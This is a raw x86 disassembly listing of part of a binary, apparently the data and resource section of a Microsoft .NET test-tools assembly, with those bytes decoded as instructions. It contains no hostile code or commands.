  402d34:	or     BYTE PTR [eax],ch
  402d36:	and    al,0x0
  402d38:	add    BYTE PTR [edx],cl
  402d3a:	sub    eax,0x2061113
  402d3f:	jb     0x402d00
  402d41:	push   cs
  402d42:	add    BYTE PTR [eax+0x8],dh
  402d45:	adc    DWORD PTR ds:0x3428,eax
  402d4b:	push   es
  402d4c:	pop    edi
  402d4d:	adc    eax,DWORD PTR [esi]
  402d4f:	or     DWORD PTR [eax],ebp
  402d51:	and    al,0x0
  402d53:	add    BYTE PTR [edx],cl
  402d55:	sub    eax,0x4120912
  402d5a:	sub    BYTE PTR [ecx+0x0],bl
  402d5d:	add    BYTE PTR [edx],cl
  402d5f:	sub    al,0x8
  402d61:	add    dl,BYTE PTR [ecx]
  402d63:	add    al,0x28
  402d65:	sub    BYTE PTR [eax],al
  402d67:	add    BYTE PTR [esi],al
  402d69:	add    dl,BYTE PTR [ecx]
  402d6b:	add    eax,0x3628
  402d70:	push   es
  402d71:	adc    DWORD PTR [esi],eax
  402d73:	sub    eax,0x32281506
  402d78:	add    BYTE PTR [eax],al
  402d7a:	or     ch,BYTE PTR [edx]
  402d7c:	adc    esi,DWORD PTR [eax]
  402d7e:	add    eax,0x6d00
  402d83:	add    BYTE PTR ds:0x16110000,cl
  402d89:	or     dl,BYTE PTR [edi]
  402d8b:	or     eax,DWORD PTR [eax+ebp*1]
  402d8e:	pop    edx
  402d8f:	add    BYTE PTR [eax],al
  402d91:	or     ch,BYTE PTR ds:0x120432
  402d97:	sub    BYTE PTR [ebx+0x0],bl
  402d9a:	add    BYTE PTR [edx],cl
  402d9c:	sub    al,0x28
  402d9e:	add    eax,0x7205252c
  402da3:	jmp    0x18b02db6
  402da8:	lea    eax,[ecx]
  402daa:	add    BYTE PTR [eax],al
  402dac:	add    DWORD PTR [eax+ecx*1],ecx
  402daf:	push   ss
  402db0:	add    esp,DWORD PTR [edx-0x73f9e8f8]
  402db6:	push   ebx
  402db7:	add    BYTE PTR [eax],al
  402db9:	add    DWORD PTR [edx+0x322808],esp
  402dbf:	add    BYTE PTR [esi],al
  402dc1:	outs   dx,DWORD PTR ds:[esi]
  402dc2:	push   ecx
  402dc3:	add    BYTE PTR [eax],al
  402dc5:	or     al,BYTE PTR [edx]
  402dc7:	add    eax,DWORD PTR [esi]
  402dc9:	sub    BYTE PTR ds:0x6060000,dh
  402dcf:	push   ss
  402dd0:	xor    eax,0x1c2c0521
  402dd5:	add    eax,0xeff72
  402dda:	jo     0x402df3
  402ddc:	lea    eax,[ecx]
  402dde:	add    BYTE PTR [eax],al
  402de0:	add    DWORD PTR ds:0xa2031609,ecx
  402de6:	or     DWORD PTR [eax],ebp
  402de8:	xor    al,BYTE PTR [eax]
  402dea:	add    BYTE PTR [esi],al
  402dec:	outs   dx,DWORD PTR ds:[esi]
  402ded:	push   ecx
  402dee:	add    BYTE PTR [eax],al
  402df0:	or     dl,BYTE PTR [esi]
  402df2:	or     eax,DWORD PTR [edi]
  402df4:	sub    al,BYTE PTR [eax]
  402df6:	add    BYTE PTR [eax],al
  402df8:	adc    esi,DWORD PTR [eax]
  402dfa:	add    al,BYTE PTR [eax]
  402dfc:	inc    ebp
  402dfd:	add    BYTE PTR [eax],al
  402dff:	add    BYTE PTR [esi],cl
  402e01:	add    BYTE PTR [eax],al
  402e03:	adc    DWORD PTR [ebx],eax
  402e05:	and    eax,0x63f2c0a
  402e0a:	jb     0x402dcb
  402e0c:	push   cs
  402e0d:	add    BYTE PTR [eax+0x28],dh
  402e10:	pop    esp
  402e11:	add    BYTE PTR [eax],al
  402e13:	or     ch,BYTE PTR ds:0x7172061b
  402e19:	push   cs
  402e1a:	add    BYTE PTR [eax+0x28],dh
  402e1d:	pop    esp
  402e1e:	add    BYTE PTR [eax],al
  402e20:	or     ch,BYTE PTR ds:0x97720616
  402e26:	push   cs
  402e27:	add    BYTE PTR [eax+0x28],dh
  402e2a:	pop    esp
  402e2b:	add    BYTE PTR [eax],al
  402e2d:	or     ch,BYTE PTR ds:0x4022a11
  402e33:	sub    BYTE PTR [eax],dh
  402e35:	add    BYTE PTR [eax],al
  402e37:	push   es
  402e38:	sub    al,BYTE PTR [edx]
  402e3a:	add    al,0x28
  402e3c:	sub    al,0x0
  402e3e:	add    BYTE PTR [esi],al
  402e40:	sub    al,BYTE PTR [edx]
  402e42:	add    al,0x28
  402e44:	add    BYTE PTR cs:[eax],al
  402e47:	push   es
  402e48:	sub    al,BYTE PTR [eax]
  402e4a:	add    BYTE PTR [eax],al
  402e4c:	sbb    esi,DWORD PTR [eax]
  402e4e:	add    DWORD PTR [eax],eax
  402e50:	aas    
  402e51:	add    BYTE PTR [eax],al
  402e53:	add    BYTE PTR [edi],cl
  402e55:	add    BYTE PTR [eax],al
  402e57:	adc    DWORD PTR [ebx],eax
  402e59:	outs   dx,DWORD PTR ds:[esi]
  402e5a:	pop    ebp
  402e5b:	add    BYTE PTR [eax],al
  402e5d:	or     cl,BYTE PTR [ebx]
  402e5f:	sub    ebx,DWORD PTR [edx+edx*1]
  402e62:	add    DWORD PTR [eax],ebp
  402e64:	pop    esi
  402e65:	add    BYTE PTR [eax],al
  402e67:	or     cl,BYTE PTR [edx]
  402e69:	add    ch,BYTE PTR [eax]
  402e6b:	sbb    eax,0x2c060000
  402e70:	push   es
  402e71:	push   es
  402e72:	sub    BYTE PTR [eax+0x0],cl
  402e75:	add    BYTE PTR [edx],cl
  402e77:	push   es
  402e78:	sub    BYTE PTR [ecx],bl
  402e7a:	add    BYTE PTR [eax],al
  402e7c:	or     dl,BYTE PTR [edx]
  402e7e:	add    DWORD PTR [eax],ebp
  402e80:	pop    edi
  402e81:	add    BYTE PTR [eax],al
  402e83:	or     ch,BYTE PTR ds:0x120ededb
  402e89:	add    esi,edi
  402e8b:	push   ss
  402e8c:	add    eax,DWORD PTR [eax]
  402e8e:	add    BYTE PTR [ebx],bl
  402e90:	outs   dx,DWORD PTR ds:[esi]
  402e91:	pusha  
  402e92:	add    BYTE PTR [eax],al
  402e94:	or     bl,ah
  402e96:	sub    al,BYTE PTR [eax]
  402e98:	add    DWORD PTR [eax],edx
  402e9a:	add    BYTE PTR [eax],al
  402e9c:	add    al,BYTE PTR [eax]
  402e9e:	pop    es
  402e9f:	add    BYTE PTR [ecx],ch
  402ea1:	xor    BYTE PTR [eax],al
  402ea3:	push   cs
  402ea4:	add    BYTE PTR [eax],al
  402ea6:	add    BYTE PTR [eax],al
  402ea8:	adc    esi,DWORD PTR [eax]
  402eaa:	add    eax,0x3600
  402eaf:	add    BYTE PTR [eax],dl
  402eb1:	add    BYTE PTR [eax],al
  402eb3:	adc    DWORD PTR [edx],eax
  402eb5:	add    eax,DWORD PTR [eax*1+0x4028040e]
  402ebc:	add    BYTE PTR [eax],al
  402ebe:	push   es
  402ebf:	or     al,BYTE PTR [esi]
  402ec1:	sub    BYTE PTR [esi+0x0],cl
  402ec4:	add    BYTE PTR [esi],al
  402ec6:	sub    BYTE PTR [esi],bh
  402ec8:	add    BYTE PTR [eax],al
  402eca:	push   es
  402ecb:	adc    al,0xfe
  402ecd:	push   es
  402ece:	cmp    al,0x0
  402ed0:	add    BYTE PTR [esi],al
  402ed2:	jae    0x402f35
  402ed4:	add    BYTE PTR [eax],al
  402ed6:	or     cl,BYTE PTR [esi]
  402ed8:	add    eax,0x3e82016
  402edd:	add    BYTE PTR [eax],al
  402edf:	jae    0x402f43
  402ee1:	add    BYTE PTR [eax],al
  402ee3:	or     al,BYTE PTR [eax+0x4000017]
  402ee9:	sub    al,BYTE PTR [eax]
  402eeb:	add    BYTE PTR [ebx],dl
  402eed:	xor    BYTE PTR [edx],al
  402eef:	add    BYTE PTR [edi],dl
  402ef1:	add    BYTE PTR [eax],al
  402ef3:	add    BYTE PTR [eax],dl
  402ef5:	add    BYTE PTR [eax],al
  402ef7:	adc    DWORD PTR [eax],ebp
  402ef9:	cmp    eax,0x28060000
  402efe:	inc    ecx
  402eff:	add    BYTE PTR [eax],al
  402f01:	push   es
  402f02:	or     al,BYTE PTR [esi]
  402f04:	sub    BYTE PTR [edi+0x0],cl
  402f07:	add    BYTE PTR [esi],al
  402f09:	sub    BYTE PTR [esi],bh
  402f0b:	add    BYTE PTR [eax],al
  402f0d:	push   es
  402f0e:	sub    al,BYTE PTR [eax]
  402f10:	adc    esi,DWORD PTR [eax]
  402f12:	add    al,BYTE PTR [eax]
  402f14:	adc    al,BYTE PTR [eax]
  402f16:	add    BYTE PTR [eax],al
  402f18:	adc    BYTE PTR [eax],al
  402f1a:	add    BYTE PTR [ecx],dl
  402f1c:	sub    BYTE PTR [edx+0x0],al
  402f1f:	add    BYTE PTR [esi],al
  402f21:	or     al,BYTE PTR [esi]
  402f23:	sub    BYTE PTR [eax+eax*1+0x0],cl
  402f27:	push   es
  402f28:	sub    BYTE PTR [esi],bh
  402f2a:	add    BYTE PTR [eax],al
  402f2c:	push   es
  402f2d:	sub    al,BYTE PTR [eax]
  402f2f:	add    BYTE PTR [ebx],dl
  402f31:	xor    BYTE PTR [edx],al
  402f33:	add    BYTE PTR [edx],dl
  402f35:	add    BYTE PTR [eax],al
  402f37:	add    BYTE PTR [eax],dl
  402f39:	add    BYTE PTR [eax],al
  402f3b:	adc    DWORD PTR [eax],ebp
  402f3d:	inc    ebx
  402f3e:	add    BYTE PTR [eax],al
  402f40:	push   es
  402f41:	or     al,BYTE PTR [esi]
  402f43:	sub    BYTE PTR [ebp+0x0],cl
  402f46:	add    BYTE PTR [esi],al
  402f48:	sub    BYTE PTR [esi],bh
  402f4a:	add    BYTE PTR [eax],al
  402f4c:	push   es
  402f4d:	sub    al,BYTE PTR [eax]
  402f4f:	add    BYTE PTR [ebx],dl
  402f51:	xor    BYTE PTR [edx],al
  402f53:	add    BYTE PTR [ebx],dl
  402f55:	add    BYTE PTR [eax],al
  402f57:	add    BYTE PTR [eax],dl
  402f59:	add    BYTE PTR [eax],al
  402f5b:	adc    DWORD PTR [edx],eax
  402f5d:	sub    BYTE PTR [eax+eax*1+0x0],al
  402f61:	push   es
  402f62:	or     al,BYTE PTR [esi]
  402f64:	sub    BYTE PTR [edx+0x0],cl
  402f67:	add    BYTE PTR [esi],al
  402f69:	sub    BYTE PTR [esi],bh
  402f6b:	add    BYTE PTR [eax],al
  402f6d:	push   es
  402f6e:	sub    al,BYTE PTR [eax]
  402f70:	adc    esi,DWORD PTR [eax]
  402f72:	add    al,BYTE PTR [eax]
  402f74:	sub    eax,DWORD PTR [eax]
  402f76:	add    BYTE PTR [eax],al
  402f78:	adc    DWORD PTR [eax],eax
  402f7a:	add    BYTE PTR [ecx],dl
  402f7c:	sub    BYTE PTR [ebp+0x0],al
  402f7f:	add    BYTE PTR [esi],al
  402f81:	or     al,BYTE PTR [esi]
  402f83:	sub    al,0x21
  402f85:	add    dh,BYTE PTR [ebp+0x1]
  402f88:	add    BYTE PTR [eax],al
  402f8a:	sbb    ecx,DWORD PTR [ebx]
  402f8c:	pop    es
  402f8d:	sub    eax,0xf17720b
  402f92:	add    BYTE PTR [eax+0x73],dh
  402f95:	arpl   WORD PTR [eax],ax
  402f97:	add    BYTE PTR [edx],cl
  402f99:	jp     0x402fa2
  402f9b:	push   es
  402f9c:	outs   dx,DWORD PTR ds:[esi]
  402f9d:	add    BYTE PTR fs:[eax],al
  402fa0:	or     ch,BYTE PTR [eax]
  402fa2:	cmp    eax,0x2a060000
  402fa7:	add    BYTE PTR [ebx],bl
  402fa9:	xor    BYTE PTR [ebx],al
  402fab:	add    BYTE PTR [ecx+0x0],al
  402fae:	add    BYTE PTR [eax],al
  402fb0:	add    al,0x0
  402fb2:	add    BYTE PTR [ecx],dl
  402fb4:	push   ss
  402fb5:	or     bh,BYTE PTR [esi+0x18]
  402fb8:	add    BYTE PTR [eax],al
  402fba:	add    al,0x25
  402fbc:	or     edx,DWORD PTR [edx]
  402fbe:	add    BYTE PTR [eax],ch
  402fc0:	sub    BYTE PTR [eax],al
  402fc2:	add    BYTE PTR [edx],cl
  402fc4:	jle    0x402fdd
  402fc6:	add    BYTE PTR [eax],al
  402fc8:	add    al,0x2c
  402fca:	sbb    eax,0x177e
  402fcf:	add    al,0x15
  402fd1:	adc    eax,0x656f
  402fd6:	or     ah,BYTE PTR [esi]
  402fd8:	jle    0x402ff1
  402fda:	add    BYTE PTR [eax],al
  402fdc:	add    al,0x6f
  402fde:	data16 add BYTE PTR [eax],al
  402fe1:	or     dl,BYTE PTR [eax+eax*4]
  402fe4:	pop    ss
  402fe5:	add    BYTE PTR [eax],al
  402fe7:	add    al,0xde
  402fe9:	or     al,BYTE PTR [esi]
  402feb:	sub    al,0x6
  402fed:	pop    es
  402fee:	sub    BYTE PTR [ebx],ch
  402ff0:	add    BYTE PTR [eax],al
  402ff2:	or     bl,ah
  402ff4:	sub    al,BYTE PTR [eax]
  402ff6:	add    BYTE PTR [eax],al
  402ff8:	add    DWORD PTR [eax],edx
  402ffa:	add    BYTE PTR [eax],al
  402ffc:	add    al,BYTE PTR [eax]
  402ffe:	add    al,BYTE PTR [eax]
  403000:	xor    al,0x36
  403002:	add    BYTE PTR [edx],cl
  403004:	add    BYTE PTR [eax],al
  403006:	add    BYTE PTR [eax],al
  403008:	adc    esi,DWORD PTR [eax]
  40300a:	add    eax,0x2f00
  40300f:	add    BYTE PTR [edx],dl
  403011:	add    BYTE PTR [eax],al
  403013:	adc    DWORD PTR [edx],eax
  403015:	sub    al,0x2b
  403017:	sub    BYTE PTR [ebp+0x0],dl
  40301a:	add    BYTE PTR [edx],cl
  40301c:	add    edx,DWORD PTR [edi]
  40301e:	lea    eax,[ecx]
  403020:	add    BYTE PTR [eax],al
  403022:	add    DWORD PTR [ebx],ecx
  403024:	pop    es
  403025:	push   ss
  403026:	add    cl,BYTE PTR [eax+esi*1-0x5dff0000]
  40302d:	pop    es
  40302e:	sub    BYTE PTR ds:0xa0a0000,bl
  403034:	push   es
  403035:	sub    BYTE PTR [edi+0x0],ah
  403038:	add    BYTE PTR [edx],cl
  40303a:	add    al,BYTE PTR [esi]
  40303c:	jae    0x4030a6
  40303e:	add    BYTE PTR [eax],al
  403040:	or     bh,BYTE PTR [edx+0x2a]
  403043:	cs jae 0x403068
  403046:	add    BYTE PTR [eax],al
  403048:	or     al,BYTE PTR [eax+0x4000018]
  40304e:	sub    bl,BYTE PTR [esi]
  403050:	add    ch,BYTE PTR [eax]
  403052:	and    al,BYTE PTR [eax]
  403054:	add    BYTE PTR [edx],cl
  403056:	sub    al,BYTE PTR [eax]
  403058:	adc    esi,DWORD PTR [eax]
  40305a:	add    al,BYTE PTR [eax]
  40305c:	xor    eax,DWORD PTR [eax]
  40305e:	add    BYTE PTR [eax],al
  403060:	adc    eax,DWORD PTR [eax]
  403062:	add    BYTE PTR [ecx],dl
  403064:	jle    0x403080
  403066:	add    BYTE PTR [eax],al
  403068:	add    al,0x14
  40306a:	sub    BYTE PTR [eax+eax*1+0x0],ch
  40306e:	or     ch,BYTE PTR [eax+eiz*1]
  403071:	jb     0x4030ac
  403073:	(bad)  
  403075:	jo     0x403047
  403077:	or     DWORD PTR [eax],eax
  403079:	add    BYTE PTR [edx],al
  40307b:	sub    BYTE PTR [edi],ch
  40307d:	add    BYTE PTR [eax],al
  40307f:	or     ch,BYTE PTR [edi+0x6d]
  403082:	add    BYTE PTR [eax],al
  403084:	or     dh,BYTE PTR [ebx+0x6e]
  403087:	add    BYTE PTR [eax],al
  403089:	or     cl,BYTE PTR [edx]
  40308b:	push   es
  40308c:	sbb    BYTE PTR [edx],0x0
  40308f:	add    BYTE PTR [esi+edi*2],al
  403092:	sbb    al,BYTE PTR [eax]
  403094:	add    BYTE PTR [edx+ebp*1],al
  403097:	sbb    bh,BYTE PTR [esi+0x1b]
  40309a:	add    BYTE PTR [eax],al
  40309c:	add    al,0x2a
  40309e:	push   ds
  40309f:	add    al,BYTE PTR [eax+0x400001b]
  4030a5:	sub    dl,BYTE PTR [esi+0x28]
  4030a8:	inc    edi
  4030a9:	add    BYTE PTR [eax],al
  4030ab:	push   es
  4030ac:	jb     0x40306c
  4030ae:	(bad)  
  4030b0:	jo     0x403130
  4030b2:	sbb    eax,DWORD PTR [eax]
  4030b4:	add    BYTE PTR [edi+ebp*2],al
  4030b7:	outs   dx,DWORD PTR ds:[esi]
  4030b8:	add    BYTE PTR [eax],al
  4030ba:	or     ch,BYTE PTR [edx]
  4030bc:	push   esi
  4030bd:	sub    BYTE PTR [edi+0x0],al
  4030c0:	add    BYTE PTR [esi],al
  4030c2:	jb     0x4030a4
  4030c4:	(bad)  
  4030c6:	jo     0x403146
  4030c8:	sbb    eax,DWORD PTR [eax]
  4030ca:	add    BYTE PTR [edi+ebp*2],al
  4030cd:	outs   dx,DWORD PTR ds:[esi]
  4030ce:	add    BYTE PTR [eax],al
  4030d0:	or     ch,BYTE PTR [edx]
  4030d2:	push   esi
  4030d3:	sub    BYTE PTR [edi+0x0],al
  4030d6:	add    BYTE PTR [esi],al
  4030d8:	jb     0x4030da
  4030da:	adc    BYTE PTR [eax],al
  4030dc:	jo     0x40315c
  4030de:	sbb    eax,DWORD PTR [eax]
  4030e0:	add    BYTE PTR [edi+ebp*2],al
  4030e3:	outs   dx,DWORD PTR ds:[esi]
  4030e4:	add    BYTE PTR [eax],al
  4030e6:	or     ch,BYTE PTR [edx]
  4030e8:	push   esi
  4030e9:	sub    BYTE PTR [edi+0x0],al
  4030ec:	add    BYTE PTR [esi],al
  4030ee:	jb     0x403106
  4030f0:	adc    BYTE PTR [eax],al
  4030f2:	jo     0x403172
  4030f4:	sbb    eax,DWORD PTR [eax]
  4030f6:	add    BYTE PTR [edi+ebp*2],al
  4030f9:	outs   dx,DWORD PTR ds:[esi]
  4030fa:	add    BYTE PTR [eax],al
  4030fc:	or     ch,BYTE PTR [edx]
  4030fe:	push   esi
  4030ff:	sub    BYTE PTR [edi+0x0],al
  403102:	add    BYTE PTR [esi],al
  403104:	jb     0x403134
  403106:	adc    BYTE PTR [eax],al
  403108:	jo     0x403188
  40310a:	sbb    eax,DWORD PTR [eax]
  40310c:	add    BYTE PTR [edi+ebp*2],al
  40310f:	outs   dx,DWORD PTR ds:[esi]
  403110:	add    BYTE PTR [eax],al
  403112:	or     ch,BYTE PTR [edx]
  403114:	push   esi
  403115:	sub    BYTE PTR [edi+0x0],al
  403118:	add    BYTE PTR [esi],al
  40311a:	jb     0x403160
  40311c:	adc    BYTE PTR [eax],al
  40311e:	jo     0x40319e
  403120:	sbb    eax,DWORD PTR [eax]
  403122:	add    BYTE PTR [edi+ebp*2],al
  403125:	outs   dx,DWORD PTR ds:[esi]
  403126:	add    BYTE PTR [eax],al
  403128:	or     ch,BYTE PTR [edx]
  40312a:	push   esi
  40312b:	sub    BYTE PTR [edi+0x0],al
  40312e:	add    BYTE PTR [esi],al
  403130:	jb     0x40318a
  403132:	adc    BYTE PTR [eax],al
  403134:	jo     0x4031b4
  403136:	sbb    eax,DWORD PTR [eax]
  403138:	add    BYTE PTR [edi+ebp*2],al
  40313b:	outs   dx,DWORD PTR ds:[esi]
  40313c:	add    BYTE PTR [eax],al
  40313e:	or     ch,BYTE PTR [edx]
  403140:	scas   eax,DWORD PTR es:[edi]
  403141:	add    eax,DWORD PTR [eax]
  403143:	add    dh,cl
  403145:	retf   0xbeef
  403148:	add    DWORD PTR [eax],eax
  40314a:	add    BYTE PTR [eax],al
  40314c:	xchg   ecx,eax
  40314d:	add    BYTE PTR [eax],al
  40314f:	add    BYTE PTR [ebx+edx*2+0x79],ch
  403153:	jae    0x4031c9
  403155:	gs ins DWORD PTR es:[edi],dx
  403157:	cs push edx
  403159:	gs jae 0x4031cb
  40315c:	jne    0x4031d0
  40315e:	arpl   WORD PTR [ebp+0x73],sp
  403161:	cs push edx
  403163:	gs jae 0x4031d5
  403166:	jne    0x4031da
  403168:	arpl   WORD PTR [ebp+0x52],sp
  40316b:	gs popa 
  40316d:	fs gs jb 0x40319d
  403171:	and    BYTE PTR [ebp+0x73],ch
  403174:	arpl   WORD PTR [edi+0x72],bp
  403177:	ins    BYTE PTR es:[edi],dx
  403178:	imul   esp,DWORD PTR [edx+0x2c],0x72655620
  40317f:	jae    0x4031ea
  403181:	outs   dx,DWORD PTR ds:[esi]
  403182:	outs   dx,BYTE PTR ds:[esi]
  403183:	cmp    eax,0x2e302e34
  403188:	xor    BYTE PTR [esi],ch
  40318a:	xor    BYTE PTR [eax+eiz*1],ch
  40318d:	inc    ebx
  40318e:	jne    0x4031fc
  403190:	je     0x403207
  403192:	jb     0x4031f9
  403194:	cmp    eax,0x7475656e
  403199:	jb     0x4031fc
  40319b:	ins    BYTE PTR es:[edi],dx
  40319c:	sub    al,0x20
  40319e:	push   eax
  40319f:	jne    0x403203
  4031a1:	ins    BYTE PTR es:[edi],dx
  4031a2:	imul   esp,DWORD PTR [ebx+0x4b],0x6f547965
  4031a9:	imul   esp,DWORD PTR [ebp+0x6e],0x3d
  4031ad:	bound  esi,QWORD PTR [edi]
  4031af:	aaa    
  4031b0:	popa   
  4031b1:	xor    eax,0x31363563
  4031b6:	cmp    DWORD PTR [ebx],esi
  4031b8:	xor    al,0x65
  4031ba:	xor    BYTE PTR [eax],bh
  4031bc:	cmp    DWORD PTR [ebx],esp
  4031be:	push   ebx
  4031bf:	jns    0x403234
  4031c1:	je     0x403228
  4031c3:	ins    DWORD PTR es:[edi],dx
  4031c4:	cs push edx
  4031c6:	gs jae 0x403238
  4031c9:	jne    0x40323d
  4031cb:	arpl   WORD PTR [ebp+0x73],sp
  4031ce:	cs push edx
  4031d0:	jne    0x403240
  4031d2:	je     0x40323d
  4031d4:	ins    DWORD PTR es:[edi],dx
  4031d5:	gs push edx
  4031d7:	gs jae 0x403249
  4031da:	jne    0x40324e
  4031dc:	arpl   WORD PTR [ebp+0x53],sp
  4031df:	gs je  0x4031e4
  4031e2:	add    BYTE PTR [eax],al
  4031e4:	add    BYTE PTR [edi],al
  4031e6:	add    BYTE PTR [eax],al
  4031e8:	add    BYTE PTR [eax],al
  4031ea:	add    BYTE PTR [eax],al
  4031ec:	add    BYTE PTR [eax+0x41],dl
  4031ef:	inc    esp
  4031f0:	push   eax
  4031f1:	inc    ecx
  4031f2:	inc    esp
  4031f3:	push   eax
  4031f4:	std    
  4031f5:	mov    al,ds:0xe1d5a2ef
  4031fa:	mov    ah,ah
  4031fc:	xor    eax,0x25fd0a50
  403201:	lea    edi,[esi+edx*1+0x6f]
  403205:	or     eax,0xde04341a
  40320a:	ss push esi
  40320c:	xor    ebx,DWORD PTR [ecx+0x7c5f28]
  403212:	add    BYTE PTR [eax],al
  403214:	and    eax,0xac000000
  403219:	add    BYTE PTR [eax],al
  40321b:	add    BYTE PTR [ebp+0x48000000],dl
  403221:	add    BYTE PTR [eax],al
  403223:	add    BYTE PTR [ecx+0x0],ah
  403226:	add    BYTE PTR [eax],al
  403228:	add    BYTE PTR [eax],al
  40322a:	add    BYTE PTR [eax],al
  40322c:	mov    bl,0x1
  40322e:	add    BYTE PTR [eax],al
  403230:	and    BYTE PTR [ecx+0x0],al
  403233:	jne    0x403235
  403235:	add    BYTE PTR fs:[ecx+0x0],ch
  403239:	outs   dx,DWORD PTR ds:[esi]
  40323a:	add    BYTE PTR [eax+eax*1+0x65],al
  40323e:	add    BYTE PTR [esi+0x0],dh
  403241:	imul   eax,DWORD PTR [eax],0x650063
  403247:	inc    ebp
  403248:	add    BYTE PTR [edx+0x0],dh
  40324b:	jb     0x40324d
  40324d:	outs   dx,DWORD PTR ds:[esi]
  40324e:	add    BYTE PTR [edx+0x0],dh
  403251:	add    BYTE PTR [eax],al
  403253:	add    BYTE PTR [eax],al
  403255:	push   ds
  403256:	inc    ebx
  403257:	add    BYTE PTR [edi+0x0],ch
  40325a:	jo     0x40325c
  40325c:	jns    0x40325e
  40325e:	jb     0x403260
  403260:	imul   eax,DWORD PTR [eax],0x680067
  403266:	je     0x403268
  403268:	push   ebx
  403269:	add    BYTE PTR [eax+eax*1+0x72],dh
  40326d:	add    BYTE PTR [ecx+0x0],ch
  403270:	outs   dx,BYTE PTR ds:[esi]
  403271:	add    BYTE PTR [edi+0x0],ah
  403274:	sub    DWORD PTR [eax],eax
  403276:	add    BYTE PTR [eax],al
  403278:	adc    al,0x50
  40327a:	add    BYTE PTR [ecx+0x0],ah
  40327d:	jne    0x40327f
  40327f:	jae    0x403281
  403281:	add    BYTE PTR gs:[ebp+0x0],al
  403285:	jb     0x403287
  403287:	jb     0x403289
  403289:	outs   dx,DWORD PTR ds:[esi]
  40328a:	add    BYTE PTR [edx+0x0],dh
  40328d:	int3   
  40328e:	add    BYTE PTR [eax],al
  403290:	add    BYTE PTR [esi],dl
  403292:	push   edx
  403293:	add    BYTE PTR [ebp+0x0],ah
  403296:	jae    0x403298
  403298:	jne    0x40329a
  40329a:	ins    DWORD PTR es:[edi],dx
  40329b:	add    BYTE PTR [ebp+0x0],ah
  40329e:	inc    ebp
  40329f:	add    BYTE PTR [edx+0x0],dh
  4032a2:	jb     0x4032a4
  4032a4:	outs   dx,DWORD PTR ds:[esi]
  4032a5:	add    BYTE PTR [edx+0x0],dh
  4032a8:	out    dx,al
  4032a9:	add    BYTE PTR [eax],al
  4032ab:	add    BYTE PTR [ebx+edx*2],dl
  4032ae:	add    BYTE PTR [eax+eax*1+0x61],dh
  4032b2:	add    BYTE PTR [edx+0x0],dh
  4032b5:	je     0x4032b7
  4032b7:	inc    ebp
  4032b8:	add    BYTE PTR [edx+0x0],dh
  4032bb:	jb     0x4032bd
  4032bd:	outs   dx,DWORD PTR ds:[esi]
  4032be:	add    BYTE PTR [edx+0x0],dh
  4032c1:	adc    DWORD PTR [ecx],eax
  4032c3:	add    BYTE PTR [eax],al
  4032c5:	adc    dl,BYTE PTR [ebx+0x0]
  4032c8:	je     0x4032ca
  4032ca:	outs   dx,DWORD PTR ds:[esi]
  4032cb:	add    BYTE PTR [eax+0x0],dh
  4032ce:	inc    ebp
  4032cf:	add    BYTE PTR [edx+0x0],dh
  4032d2:	jb     0x4032d4
  4032d4:	outs   dx,DWORD PTR ds:[esi]
  4032d5:	add    BYTE PTR [edx+0x0],dh
  4032d8:	das    
  4032d9:	add    DWORD PTR [eax],eax
  4032db:	add    BYTE PTR [esi],dl
  4032dd:	push   ebp
  4032de:	add    BYTE PTR [ebx+0x0],dh
  4032e1:	popa   
  4032e2:	add    BYTE PTR [edi+0x0],ah
  4032e5:	add    BYTE PTR gs:[ebx+0x0],dl
  4032e9:	je     0x4032eb
  4032eb:	jb     0x4032ed
  4032ed:	imul   eax,DWORD PTR [eax],0x67006e
  4032f3:	dec    ebp
  4032f4:	add    DWORD PTR [eax],eax
  4032f6:	add    BYTE PTR [ecx],al
  4032f8:	daa    
  4032f9:	inc    ebp
  4032fa:	jb     0x40336e
  4032fc:	outs   dx,DWORD PTR ds:[esi]
  4032fd:	jb     0x40331f
  4032ff:	addr16 gs je 0x403377
  403303:	imul   ebp,DWORD PTR [esi+0x67],0x66656420
  40330a:	popa   
  40330b:	jne    0x403379
  40330d:	je     0x40332f
  40330f:	popa   
  403310:	jne    0x403376
  403312:	imul   ebp,DWORD PTR [edi+0x20],0x69766564
  403319:	arpl   WORD PTR [ebp+0x3a],sp
  40331c:	and    BYTE PTR [ebx+0x30],bh
  40331f:	jge    0x403322
  403321:	mov    al,ds:0x63694d01
  403326:	jb     0x403397
  403328:	jae    0x403399
  40332a:	data16 je 0x40334d
  40332d:	sub    BYTE PTR [edx+0x29],dl
  403330:	and    BYTE PTR [esi+0x69],dl
  403333:	jae    0x4033aa
  403335:	popa   
  403336:	ins    BYTE PTR es:[edi],dx
  403337:	and    BYTE PTR [ebx+0x74],dl
  40333a:	jne    0x4033a0
  40333c:	imul   ebp,DWORD PTR [edi+0x20],0x74736554
  403343:	and    BYTE PTR [edi+ebp*2+0x6f],dl
  403347:	ins    BYTE PTR es:[edi],dx
  403348:	jae    0x40336a
  40334a:	push   esi
  40334b:	imul   esp,DWORD PTR [ebp+eiz*2+0x6f],0x63655220
  403353:	outs   dx,DWORD PTR ds:[esi]
  403354:	jb     0x4033ba
  403356:	gs jb  0x403379
  403359:	push   esi
  40335a:	gs jb  0x4033d0
  40335d:	imul   ebp,DWORD PTR [edi+0x6e],0x7d307b20
  403364:	or     eax,0x726f660a
  403369:	and    BYTE PTR [ebp+0x69],cl
  40336c:	arpl   WORD PTR [edx+0x6f],si
  40336f:	jae    0x4033e0
  403371:	data16 je 0x403394
  403374:	push   esi
  403375:	imul   esi,DWORD PTR [ebx+0x75],0x53206c61
  40337c:	je     0x4033f3
  40337e:	imul   ebp,DWORD PTR fs:[edi+0x20],0x32313032
  403386:	or     eax,0x706f430a
  40338b:	jns    0x4033ff
  40338d:	imul   esp,DWORD PTR [edi+0x68],0x63282074
  403394:	sub    DWORD PTR [eax],esp
  403396:	dec    ebp
  403397:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  40339e:	je     0x4033c0
  4033a0:	inc    ebx
  4033a1:	outs   dx,DWORD PTR ds:[esi]
  4033a2:	jb     0x403414
  4033a4:	outs   dx,DWORD PTR ds:[esi]
  4033a5:	jb     0x403408
  4033a7:	je     0x403412
  4033a9:	outs   dx,DWORD PTR ds:[esi]
  4033aa:	outs   dx,BYTE PTR ds:[esi]
  4033ab:	and    BYTE PTR cs:[eax],ah
  4033ae:	inc    ecx
  4033af:	ins    BYTE PTR es:[edi],dx
  4033b0:	ins    BYTE PTR es:[edi],dx
  4033b1:	and    BYTE PTR [edx+0x69],dh
  4033b4:	addr16 push 0x72207374
  4033ba:	gs jae 0x403422
  4033bd:	jb     0x403435
  4033bf:	gs fs and BYTE PTR cs:[ecx],al
